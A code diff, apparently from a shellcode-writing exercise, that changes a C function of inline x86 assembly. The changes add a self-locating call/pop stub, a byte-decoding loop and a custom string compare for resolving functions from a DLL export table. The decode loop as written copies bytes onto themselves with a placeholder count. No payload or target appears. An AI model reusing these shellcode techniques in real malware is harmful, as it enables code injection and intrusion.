@@ -11,10 +11,15 @@ void shell()
 {
 	__asm
 	{
-		sub esp, 0x66;
 		__asm _emit(0xE8)__asm _emit(0xFF)__asm _emit(0xFF)__asm _emit(0xFF);
 		__asm _emit(0xFF)__asm _emit(0xC3)__asm _emit(0x5E);
-		add esi, 0xE;
+		add esi, 0x1E;
+		mov ecx, 0x1234578;
+		xor ebx, ebx;
+	tag_Decode:
+		mov bx, [esi + ecx];
+		mov[esi + ecx], bx;
+		loop tag_Decode;
 		push esi;
 		mov ebp, esp;
 		push esi;
@@ -111,14 +116,12 @@ void shell()
 		add eax, esi;
 		push ecx;
 		push eax;
-		//push esi;
-		//call CheckINT;
-		call strcmp;
+		call tag_strcmp;
+		pop edx;
+		pop ecx;
 		add edi, 0x4;
 		dec ebx;
 		test eax, eax;
-		pop edx;
-		pop ecx;
 		jnz tag_ENT;
 		//找到了该函数
 		pop eax;
@@ -141,6 +144,22 @@ void shell()
 		mov eax, [ecx - 0x4];	//得到地址
 		add eax, esi;
 		ret;
+	tag_strcmp:
+		push esi;
+		push edi;
+		xchg eax, esi;
+		xchg ecx, edi;
+		mov ecx, 15;
+		cld;					// 改变方向从左向右进行比较
+		repe cmpsb;				// 循环按字节进行比较
+		xchg ecx, eax;
+		jz tag_strcmp2;
+		inc eax;
+	tag_strcmp2:
+		pop edi;
+		pop esi;
+		ret;
+
 	tag_ShellCode:
 		push edx;
 		push ecx;
@@ -148,6 +167,7 @@ void shell()
 		push edx;
 		call eax;
 		ret;
+		__asm _emit(0x90)__asm _emit(0x90)__asm _emit(0x90)__asm _emit(0x90);
 	}
 }
 
@@ -169,7 +189,7 @@ int main()
 		return 0;
 	dwLen = GetFileSize(handle, 0);
 	printf("打开文件%p\t%lu\n", handle, dwLen);
-	if (::ReadFile(handle, buff, dwLen, 0, NULL))
+	if (ReadFile(handle, buff, dwLen, 0, NULL))
 	{
 		CloseHandle(handle);
 		test(buff, dwLen);
